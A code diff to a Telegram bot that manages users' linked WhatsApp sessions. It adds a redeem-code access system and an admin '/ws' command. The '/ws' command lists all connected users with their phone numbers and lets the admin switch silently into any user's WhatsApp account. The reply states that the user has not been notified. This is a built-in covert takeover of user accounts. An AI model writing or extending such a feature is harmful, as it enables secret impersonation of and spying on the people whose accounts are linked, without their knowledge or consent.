@@ -47,6 +47,10 @@ import {
   protectSessionFromEviction,
   unprotectSession,
   markSessionActive,
+  setAdminSessionOverride,
+  clearAdminSessionOverride,
+  getAdminSessionOverride,
+  getAllConnectedSessions,
 } from "./whatsapp";
 import { parseVCF, normalizePhone } from "./vcf-parser";
 import QRCode from "qrcode";
@@ -66,6 +70,11 @@ import {
   getReferralStats,
   findAndMarkTrialsToWarn,
   AccessState,
+  createRedeemCode,
+  getRedeemCode,
+  getAllRedeemCodes,
+  deleteRedeemCode,
+  redeemCode as redeemCodeDb,
 } from "./mongo-bot-data";
 import { getSessionStats, cleanupStaleSessions, clearMongoSession } from "./mongo-auth-state";
 import {
@@ -2747,6 +2756,10 @@ bot.callbackQuery("pl_all", async (ctx) => {
 
 bot.command("admin", async (ctx) => {
   if (!isAdmin(ctx.from!.id)) { await ctx.reply("🚫 You are not an admin."); return; }
+  const wsOverride = getAdminSessionOverride(String(ctx.from!.id));
+  const wsStatus = wsOverride
+    ? `\n🔀 <b>Active WS Session:</b> Viewing user <code>${wsOverride}</code> — <code>/ws off</code> to return to your own`
+    : "";
   await ctx.reply(
     "🛡️ <b>Admin Panel</b>\n\n" +
     "📋 <b>Commands:</b>\n\n" +
@@ -2765,11 +2778,21 @@ bot.command("admin", async (ctx) => {
     "🎁 <b>Refer Mode:</b>\n" +
     "🟢 <code>/refermode on</code> — Enable refer mode (24h trial + referrals)\n" +
     "🔴 <code>/refermode off</code> — Disable refer mode (back to normal)\n\n" +
+    "🎫 <b>Redeem Codes:</b>\n" +
+    "➕ <code>/redeem CODE DAYS MAXUSERS</code> — Create redeem code\n" +
+    "📊 <code>/redeem CODE</code> — View code stats (who redeemed, remaining)\n" +
+    "📋 <code>/redeem list</code> — List all codes (live status)\n" +
+    "🗑️ <code>/redeem delete CODE</code> — Delete a code\n\n" +
+    "🔀 <b>WhatsApp Session Switch:</b>\n" +
+    "🔀 <code>/ws</code> — All WA sessions (userId + phone number)\n" +
+    "🔀 <code>/ws [userId]</code> — Switch to that user's WhatsApp (silent)\n" +
+    "🔀 <code>/ws off</code> — Back to your own WhatsApp\n\n" +
     "🤖 <b>Auto Chat Controls:</b>\n" +
     "🟢 <code>/autochat on</code> — Auto Chat sabhi users ke liye ON\n" +
     "🔴 <code>/autochat off</code> — Auto Chat sabhi users ke liye OFF\n" +
     "✅ <code>/accessautochat [id]</code> — Specific user ke liye Auto Chat ON\n" +
-    "❌ <code>/revokeautochat [id]</code> — Specific user ka Auto Chat OFF",
+    "❌ <code>/revokeautochat [id]</code> — Specific user ka Auto Chat OFF" +
+    wsStatus,
 
     { parse_mode: "HTML" }
   );
@@ -2866,6 +2889,225 @@ bot.command("revokeautochat", async (ctx) => {
   await saveBotData(data);
   autoChatAccessSet.delete(id);
   await ctx.reply(`❌ <b>Auto Chat Access Revoked!</b>\n\n👤 User: <code>${id}</code>\n🚫 Is user ko ab Auto Chat button nahi dikhega.`, { parse_mode: "HTML" });
+});
+
+// ─── /redeem ─────────────────────────────────────────────────────────────────
+// Admin:
+//   /redeem CODE DAYS MAXUSERS  → create a code
+//   /redeem CODE                → view stats (who redeemed, slots remaining)
+//   /redeem list                → list all codes
+//   /redeem delete CODE         → delete a code
+// User:
+//   /redeem CODE                → redeem the code (instant access like /access)
+bot.command("redeem", async (ctx) => {
+  const userId = ctx.from!.id;
+  const args = (ctx.message?.text || "").split(/\s+/).slice(1);
+
+  // ── USER: redeem a code ───────────────────────────────────────────────────
+  if (!isAdmin(userId)) {
+    if (!args.length) {
+      await ctx.reply(
+        "🎫 <b>Redeem a Code</b>\n\n" +
+        "Usage: <code>/redeem CODE</code>\n\n" +
+        "Enter the redeem code given to you by the admin.",
+        { parse_mode: "HTML" }
+      );
+      return;
+    }
+    const code = args[0];
+    const result = await redeemCodeDb(code, userId, ADMIN_USER_ID);
+    if (result.success) {
+      const exp = new Date(result.expiresAt!).toUTCString();
+      await ctx.reply(
+        `🎉 <b>Code Redeemed Successfully!</b>\n\n` +
+        `🎫 Code: <code>${code.toUpperCase()}</code>\n` +
+        `📅 Access: ${result.days} day${result.days === 1 ? "" : "s"}\n` +
+        `⏰ Expires (UTC): ${exp}\n\n` +
+        `✅ All features unlocked! Send /start to open the menu.`,
+        { parse_mode: "HTML" }
+      );
+    } else {
+      const reasons: Record<string, string> = {
+        not_found: "❌ Invalid code. Please check and try again.",
+        already_redeemed: "⚠️ You have already redeemed this code.",
+        max_users_reached: "🚫 This code has reached its maximum usage limit.",
+      };
+      await ctx.reply(reasons[result.reason!] || "❌ Could not redeem code.", { parse_mode: "HTML" });
+    }
+    return;
+  }
+
+  // ── ADMIN commands ────────────────────────────────────────────────────────
+  if (!args.length) {
+    await ctx.reply(
+      "🎫 <b>Redeem Codes</b>\n\n" +
+      "➕ <code>/redeem CODE DAYS MAXUSERS</code> — Create redeem code\n" +
+      "📊 <code>/redeem CODE</code> — View code stats\n" +
+      "📋 <code>/redeem list</code> — List all codes\n" +
+      "🗑️ <code>/redeem delete CODE</code> — Delete a code",
+      { parse_mode: "HTML" }
+    );
+    return;
+  }
+
+  // /redeem list
+  if (args[0].toLowerCase() === "list") {
+    const codes = await getAllRedeemCodes();
+    const entries = Object.entries(codes);
+    if (!entries.length) {
+      await ctx.reply("📋 <b>No redeem codes found.</b>\n\nCreate one with:\n<code>/redeem CODE DAYS MAXUSERS</code>", { parse_mode: "HTML" });
+      return;
+    }
+    let text = `📋 <b>Redeem Codes (${entries.length})</b>\n\n`;
+    for (const [code, entry] of entries) {
+      const used = entry.usedBy.length;
+      const remaining = entry.maxUsers - used;
+      const status = remaining > 0 ? "🟢 Active" : "🔴 Full";
+      text += `🎫 <code>${code}</code>\n`;
+      text += `   ${status} | 📅 ${entry.days}d | 👥 ${used}/${entry.maxUsers} used | ${remaining} slots left\n\n`;
+    }
+    await ctx.reply(text, { parse_mode: "HTML" });
+    return;
+  }
+
+  // /redeem delete CODE
+  if (args[0].toLowerCase() === "delete") {
+    const code = args[1];
+    if (!code) {
+      await ctx.reply("❓ Usage: <code>/redeem delete CODE</code>", { parse_mode: "HTML" });
+      return;
+    }
+    const result = await deleteRedeemCode(code);
+    if (result.success) {
+      await ctx.reply(`🗑️ <b>Code Deleted!</b>\n\n🎫 <code>${code.toUpperCase()}</code> has been removed.`, { parse_mode: "HTML" });
+    } else {
+      await ctx.reply(`⚠️ Code <code>${code.toUpperCase()}</code> not found.`, { parse_mode: "HTML" });
+    }
+    return;
+  }
+
+  // /redeem CODE DAYS MAXUSERS (create) — 3 args
+  if (args.length >= 3) {
+    const code = args[0];
+    const days = parseInt(args[1]);
+    const maxUsers = parseInt(args[2]);
+    if (isNaN(days) || days <= 0 || isNaN(maxUsers) || maxUsers <= 0) {
+      await ctx.reply("❓ Example: <code>/redeem SPIDY 5 2</code>\n(code: SPIDY, days: 5, max users: 2)", { parse_mode: "HTML" });
+      return;
+    }
+    const result = await createRedeemCode(code, days, maxUsers);
+    if (result.success) {
+      await ctx.reply(
+        `✅ <b>Redeem Code Created!</b>\n\n` +
+        `🎫 Code: <code>${code.toUpperCase()}</code>\n` +
+        `📅 Days: ${days}\n` +
+        `👥 Max Users: ${maxUsers}\n\n` +
+        `Users can redeem with: <code>/redeem ${code.toUpperCase()}</code>`,
+        { parse_mode: "HTML" }
+      );
+    } else {
+      await ctx.reply(`⚠️ Code <code>${code.toUpperCase()}</code> already exists. Delete it first with <code>/redeem delete ${code.toUpperCase()}</code>`, { parse_mode: "HTML" });
+    }
+    return;
+  }
+
+  // /redeem CODE (1 arg, admin → view stats)
+  const code = args[0];
+  const entry = await getRedeemCode(code);
+  if (!entry) {
+    await ctx.reply(`⚠️ Code <code>${code.toUpperCase()}</code> not found.`, { parse_mode: "HTML" });
+    return;
+  }
+  const used = entry.usedBy.length;
+  const remaining = entry.maxUsers - used;
+  const status = remaining > 0 ? "🟢 Active" : "🔴 Full";
+  const usedList = entry.usedBy.length
+    ? entry.usedBy.map((id) => `  • <code>${id}</code>`).join("\n")
+    : "  None";
+  const created = new Date(entry.createdAt).toUTCString();
+  await ctx.reply(
+    `📊 <b>Code Stats: <code>${code.toUpperCase()}</code></b>\n\n` +
+    `${status}\n` +
+    `📅 Days granted: ${entry.days}\n` +
+    `👥 Used: ${used}/${entry.maxUsers} (${remaining} slots remaining)\n` +
+    `📆 Created: ${created}\n\n` +
+    `👤 <b>Redeemed by:</b>\n${usedList}`,
+    { parse_mode: "HTML" }
+  );
+});
+
+// ─── /ws — Admin WhatsApp session switching ──────────────────────────────────
+// /ws              → list all connected WA sessions (userId + phone)
+// /ws [userId]     → switch to that user's WhatsApp session silently
+// /ws off          → clear override, go back to admin's own WhatsApp
+bot.command("ws", async (ctx) => {
+  if (!isAdmin(ctx.from!.id)) { await ctx.reply("🚫 You are not an admin."); return; }
+  const adminId = ctx.from!.id;
+  const arg = (ctx.message?.text || "").split(/\s+/)[1]?.trim();
+
+  // /ws off — clear override
+  if (arg?.toLowerCase() === "off") {
+    clearAdminSessionOverride(String(adminId));
+    await ctx.reply(
+      "✅ <b>WhatsApp session restored to your own.</b>\n\n" +
+      "You are now using your own WhatsApp connection.",
+      { parse_mode: "HTML" }
+    );
+    return;
+  }
+
+  // /ws [userId] — switch to that user's session
+  if (arg) {
+    const targetId = arg;
+    const success = setAdminSessionOverride(String(adminId), targetId);
+    if (!success) {
+      await ctx.reply(
+        `❌ <b>Cannot switch to user <code>${targetId}</code></b>\n\n` +
+        `That user's WhatsApp is not currently connected.\n\n` +
+        `Use <code>/ws</code> to see all connected sessions.`,
+        { parse_mode: "HTML" }
+      );
+      return;
+    }
+    const sessions = getAllConnectedSessions();
+    const target = sessions.find((s) => s.userId === targetId);
+    const phone = target?.phoneNumber || "Unknown";
+    await ctx.reply(
+      `🔀 <b>Switched to User's WhatsApp!</b>\n\n` +
+      `👤 User ID: <code>${targetId}</code>\n` +
+      `📱 Phone: <code>${phone}</code>\n\n` +
+      `✅ All WhatsApp features now operate on this user's account.\n` +
+      `🔇 The user has NOT been notified.\n\n` +
+      `To go back: <code>/ws off</code>`,
+      { parse_mode: "HTML" }
+    );
+    return;
+  }
+
+  // /ws — list all connected sessions
+  const sessions = getAllConnectedSessions();
+  if (!sessions.length) {
+    await ctx.reply(
+      "📭 <b>No connected WhatsApp sessions found.</b>\n\n" +
+      "Users need to connect their WhatsApp first.",
+      { parse_mode: "HTML" }
+    );
+    return;
+  }
+  const currentOverride = getAdminSessionOverride(String(adminId));
+  let text = `🔀 <b>Connected WhatsApp Sessions (${sessions.length})</b>\n\n`;
+  for (const s of sessions) {
+    const isActive = s.userId === currentOverride;
+    text += `${isActive ? "🔵 <b>[ACTIVE]</b> " : ""}👤 <code>${s.userId}</code> — 📱 <code>${s.phoneNumber || "Unknown"}</code>\n`;
+    if (isActive) text += `   ↳ You are currently using this session\n`;
+  }
+  text += `\n<b>How to switch:</b>\n`;
+  text += `<code>/ws [userId]</code> — Switch to that user's WhatsApp\n`;
+  text += `<code>/ws off</code> — Back to your own WhatsApp`;
+  if (currentOverride) {
+    text += `\n\n🔀 <b>Current override:</b> <code>${currentOverride}</code>`;
+  }
+  await ctx.reply(text, { parse_mode: "HTML" });
 });
 
 bot.command("access", async (ctx) => {
